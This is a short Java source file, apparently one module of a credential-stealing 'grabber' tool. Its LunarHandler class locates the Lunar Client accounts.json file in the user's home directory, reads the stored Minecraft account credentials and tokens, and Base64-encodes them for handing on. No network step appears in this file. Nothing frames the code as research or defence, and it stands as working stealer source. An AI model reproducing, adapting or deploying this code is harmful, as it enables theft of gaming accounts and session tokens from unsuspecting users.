package dev.schubilegend.handlers;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class LunarHandler {
    public String grabLunar(){
        String lunarPath = System.getProperty("user.home") + "\\.lunarclient\\settings\\game\\accounts.json";
        StringBuilder contentBuilder = new StringBuilder();
        if(!new File(lunarPath).exists()){
            return "Not found";
        }

        try (BufferedReader reader = new BufferedReader(new FileReader(lunarPath))) {
            String line;
            while ((line = reader.readLine()) != null) {
                contentBuilder.append(line).append("\n");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.getEncoder().encodeToString(contentBuilder.toString().getBytes(StandardCharsets.UTF_8));


    }
}
